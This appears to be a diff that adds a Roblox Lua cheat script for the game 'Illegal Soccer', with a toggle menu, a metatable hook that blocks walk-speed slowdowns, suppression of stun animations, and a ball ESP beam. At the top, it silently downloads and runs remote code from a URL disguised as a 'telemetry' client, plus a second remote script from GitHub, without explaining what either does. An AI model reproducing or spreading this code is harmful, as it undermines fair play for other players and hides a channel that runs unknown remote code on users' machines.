@@ -1,0 +1,295 @@
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local Workspace = game:GetService("Workspace")
+local player = Players.LocalPlayer
+
+-- ========================================================
+-- TỰ ĐỘNG KHỞI ĐỘNG VÔ HẠN NĂNG LƯỢNG
+-- ========================================================
+task.spawn(function()
+	pcall(function()
+		loadstring(game:HttpGet("https://rscripts.net/api/telemetry/v2/client.lua?s=6aa88c6356383caba00c52a8"))()
+	end)
+end)
+
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Lutosys/opensrc/refs/heads/main/IllegalSoccerinfinitestamina.lua"))()
+end)
+
+-- ========================================================
+-- 1. TRẠNG THÁI & MENU GUI
+-- ========================================================
+
+local espEnabled = false
+local noSlowdownEnabled = false
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "IllegalSoccerNoHitbox_Gui"
+ScreenGui.ResetOnSpawn = false 
+
+local success = pcall(function() 
+    ScreenGui.Parent = game:GetService("CoreGui") 
+end)
+if not success then 
+    ScreenGui.Parent = player:WaitForChild("PlayerGui") 
+end
+
+local OpenBtn = Instance.new("TextButton")
+OpenBtn.Name = "ToggleMenuButton"
+OpenBtn.Parent = ScreenGui
+OpenBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+OpenBtn.Position = UDim2.new(0, 10, 0.3, 0)
+OpenBtn.Size = UDim2.new(0, 75, 0, 35)
+OpenBtn.Font = Enum.Font.GothamBold
+OpenBtn.Text = "toggle"
+OpenBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+OpenBtn.TextSize = 13
+OpenBtn.BorderSizePixel = 0
+OpenBtn.Active = true
+OpenBtn.Draggable = true 
+
+local MainFrame = Instance.new("Frame")
+MainFrame.Parent = ScreenGui
+MainFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+MainFrame.Position = UDim2.new(0.5, -100, 0.35, -60)
+MainFrame.Size = UDim2.new(0, 200, 0, 120)
+MainFrame.Active = true
+MainFrame.Draggable = true 
+MainFrame.BorderSizePixel = 0
+MainFrame.Visible = true
+
+local TopBar = Instance.new("TextLabel")
+TopBar.Parent = MainFrame
+TopBar.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+TopBar.Size = UDim2.new(1, 0, 0, 25)
+TopBar.Font = Enum.Font.GothamBold
+TopBar.Text = " lllegal soccer by 0painph10"
+TopBar.TextColor3 = Color3.fromRGB(255, 255, 255)
+TopBar.TextSize = 12
+TopBar.TextXAlignment = Enum.TextXAlignment.Left
+TopBar.BorderSizePixel = 0
+
+local ContentFrame = Instance.new("Frame")
+ContentFrame.Parent = MainFrame
+ContentFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+ContentFrame.Position = UDim2.new(0, 0, 0, 25)
+ContentFrame.Size = UDim2.new(1, 0, 1, -25)
+ContentFrame.BorderSizePixel = 0
+
+local NoSlowdownButton = Instance.new("TextButton")
+NoSlowdownButton.Parent = ContentFrame
+NoSlowdownButton.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
+NoSlowdownButton.Position = UDim2.new(0.05, 0, 0.1, 0)
+NoSlowdownButton.Size = UDim2.new(0.9, 0, 0.36, 0)
+NoSlowdownButton.Font = Enum.Font.GothamBold
+NoSlowdownButton.Text = "No Slowdown: OFF"
+NoSlowdownButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+NoSlowdownButton.TextSize = 12
+NoSlowdownButton.BorderSizePixel = 0
+
+local ESPButton = Instance.new("TextButton")
+ESPButton.Parent = ContentFrame
+ESPButton.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
+ESPButton.Position = UDim2.new(0.05, 0, 0.54, 0)
+ESPButton.Size = UDim2.new(0.9, 0, 0.36, 0)
+ESPButton.Font = Enum.Font.GothamBold
+ESPButton.Text = "Ball ESP: OFF"
+ESPButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+ESPButton.TextSize = 12
+ESPButton.BorderSizePixel = 0
+
+-- ========================================================
+-- 2. HOOK CHẶN GAME HẠ WALKSPEED KHI SÚT
+-- ========================================================
+
+local rawmeta = getrawmetatable or getmetatable
+if rawmeta and setreadonly then
+    local mt = rawmeta(game)
+    setreadonly(mt, false)
+    local oldNewIndex = mt.__newindex
+
+    mt.__newindex = newcclosure(function(t, k, v)
+        if noSlowdownEnabled and not checkcaller() and typeof(t) == "Instance" and t:IsA("Humanoid") then
+            if k == "WalkSpeed" or k == "walkSpeed" then
+                if type(v) == "number" and v < 16 then
+                    v = 16 -- Ép giữ nguyên tốc độ chạy lúc sút
+                end
+            end
+        end
+        return oldNewIndex(t, k, v)
+    end)
+    setreadonly(mt, true)
+end
+
+-- ========================================================
+-- 3. HÀM TÌM BÓNG
+-- ========================================================
+
+local function getBall()
+    for _, obj in pairs(Workspace:GetDescendants()) do
+        local isPlayerPart = false
+        for _, p in pairs(Players:GetPlayers()) do
+            if p.Character and obj:IsDescendantOf(p.Character) then
+                isPlayerPart = true
+                break
+            end
+        end
+
+        if not isPlayerPart then
+            if obj:IsA("BasePart") then
+                local nameLower = string.lower(obj.Name)
+                if string.find(nameLower, "ball") or string.find(nameLower, "soccer") 
+                   or string.find(nameLower, "football") or string.find(nameLower, "pelota") 
+                   or string.find(nameLower, "tps") or obj.Shape == Enum.PartType.Ball then
+                    return obj
+                end
+            elseif obj:IsA("Model") then
+                local nameLower = string.lower(obj.Name)
+                if string.find(nameLower, "ball") or string.find(nameLower, "soccer") or string.find(nameLower, "football") then
+                    local part = obj.PrimaryPart or obj:FindFirstChildWhichIsA("BasePart")
+                    if part then return part end
+                end
+            end
+        end
+    end
+    return nil
+end
+
+-- ========================================================
+-- 4. SỰ KIỆN NÚT BẤM
+-- ========================================================
+
+OpenBtn.MouseButton1Click:Connect(function()
+    MainFrame.Visible = not MainFrame.Visible
+end)
+
+NoSlowdownButton.MouseButton1Click:Connect(function()
+    noSlowdownEnabled = not noSlowdownEnabled
+    NoSlowdownButton.Text = noSlowdownEnabled and "No Slowdown: ON" or "No Slowdown: OFF"
+    NoSlowdownButton.BackgroundColor3 = noSlowdownEnabled and Color3.fromRGB(50, 220, 50) or Color3.fromRGB(220, 50, 50)
+    
+    if noSlowdownEnabled and player.Character and player.Character:FindFirstChildOfClass("Humanoid") then
+        player.Character:FindFirstChildOfClass("Humanoid").WalkSpeed = 16
+    end
+end)
+
+local function cleanupESP()
+    for _, obj in pairs(Workspace:GetDescendants()) do
+        if obj:FindFirstChild("BallESP_Gui") then obj.BallESP_Gui:Destroy() end
+        if obj:FindFirstChild("Ball_Att") then obj.Ball_Att:Destroy() end
+    end
+    local char = player.Character
+    if char and char:FindFirstChild("HumanoidRootPart") then
+        local root = char.HumanoidRootPart
+        if root:FindFirstChild("Player_Att") then root.Player_Att:Destroy() end
+        if root:FindFirstChild("Ball_Beam") then root.Ball_Beam:Destroy() end
+    end
+end
+
+ESPButton.MouseButton1Click:Connect(function()
+    espEnabled = not espEnabled
+    ESPButton.Text = espEnabled and "Ball ESP: ON" or "Ball ESP: OFF"
+    ESPButton.BackgroundColor3 = espEnabled and Color3.fromRGB(50, 220, 50) or Color3.fromRGB(220, 50, 50)
+    if not espEnabled then cleanupESP() end
+end)
+
+-- ========================================================
+-- 5. VÒNG LẶP XỬ LÝ NO SLOWDOWN & ESP
+-- ========================================================
+
+RunService.PreRender:Connect(function()
+    local character = player.Character
+    if not character then return end
+
+    local humanoid = character:FindFirstChildOfClass("Humanoid")
+    local rootPart = character:FindFirstChild("HumanoidRootPart")
+    local ballPart = getBall()
+
+    if not humanoid or not rootPart or humanoid.Health <= 0 then return end
+
+    -- 1. CHỐNG KHỰNG / CHẬM KHI SÚT BÓNG
+    if noSlowdownEnabled then
+        if humanoid.WalkSpeed < 16 then
+            humanoid.WalkSpeed = 16
+        end
+
+        humanoid.AutoRotate = true
+        humanoid.PlatformStand = false
+
+        -- Tăng tốc Animation sút để không trễ đà
+        local animator = humanoid:FindFirstChildOfClass("Animator")
+        if animator then
+            for _, track in pairs(animator:GetPlayingAnimationTracks()) do
+                local n = string.lower(track.Name)
+                if string.find(n, "shoot") or string.find(n, "kick") or string.find(n, "sut") then
+                    track:AdjustSpeed(2.5)
+                elseif string.find(n, "slow") or string.find(n, "stun") or string.find(n, "tackle") then
+                    track:Stop()
+                end
+            end
+        end
+
+        -- Clear biến trạng thái làm chậm trong nhân vật
+        for _, child in pairs(character:GetDescendants()) do
+            if child:IsA("ValueBase") then
+                local n = string.lower(child.Name)
+                if string.find(n, "shoot") or string.find(n, "kick") or string.find(n, "slow") or string.find(n, "kickslow") then
+                    if child:IsA("BoolValue") then 
+                        child.Value = false 
+                    elseif child:IsA("NumberValue") or child:IsA("IntValue") then 
+                        child.Value = 0 
+                    end
+                end
+            end
+        end
+    end
+
+    -- 2. BALL ESP & BEAM
+    if espEnabled and ballPart then
+        local playerAtt = rootPart:FindFirstChild("Player_Att") or Instance.new("Attachment", rootPart)
+        playerAtt.Name = "Player_Att"
+
+        local ballAtt = ballPart:FindFirstChild("Ball_Att") or Instance.new("Attachment", ballPart)
+        ballAtt.Name = "Ball_Att"
+
+        local beam = rootPart:FindFirstChild("Ball_Beam")
+        if not beam then
+            beam = Instance.new("Beam")
+            beam.Name = "Ball_Beam"
+            beam.Width0 = 0.25
+            beam.Width1 = 0.25
+            beam.Color = ColorSequence.new(Color3.fromRGB(255, 230, 0))
+            beam.FaceCamera = true
+            beam.LightEmission = 1
+            beam.LightInfluence = 0
+            beam.Attachment0 = playerAtt
+            beam.Attachment1 = ballAtt
+            beam.Parent = rootPart
+        else
+            beam.Attachment0 = playerAtt
+            beam.Attachment1 = ballAtt
+            beam.Enabled = true
+        end
+
+        if not ballPart:FindFirstChild("BallESP_Gui") then
+            local billboard = Instance.new("BillboardGui")
+            billboard.Name = "BallESP_Gui"
+            billboard.AlwaysOnTop = true
+            billboard.Size = UDim2.new(0, 100, 0, 30)
+            billboard.StudsOffset = Vector3.new(0, 2.5, 0)
+            billboard.Adornee = ballPart
+            billboard.Parent = ballPart
+
+            local label = Instance.new("TextLabel", billboard)
+            label.Size = UDim2.new(1, 0, 1, 0)
+            label.BackgroundTransparency = 1
+            label.Text = "⚽ BALL"
+            label.TextColor3 = Color3.fromRGB(255, 230, 0)
+            label.TextStrokeTransparency = 0
+            label.Font = Enum.Font.GothamBold
+            label.TextSize = 15
+        end
+    elseif rootPart and rootPart:FindFirstChild("Ball_Beam") then
+        rootPart.Ball_Beam.Enabled = false
+    end
+end)
